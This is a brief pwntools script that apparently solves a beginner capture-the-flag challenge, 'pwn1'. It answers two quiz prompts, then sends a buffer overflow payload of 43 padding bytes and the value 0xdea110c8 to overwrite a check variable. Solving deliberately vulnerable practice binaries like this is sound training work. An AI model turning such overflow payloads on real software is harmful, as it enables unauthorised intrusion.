#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./pwn1")
p = process(elf.path)

# Question 1
p.recvuntil(b"name?")
p.sendline(b"Sir Lancelot of Camelot")

# Question 2
p.recvuntil(b"quest?")
p.sendline(b"To seek the Holy Grail.")

# Question 3
payload = b"A" * 43
payload += p32(0xdea110c8)
p.sendline(payload)

p.interactive()
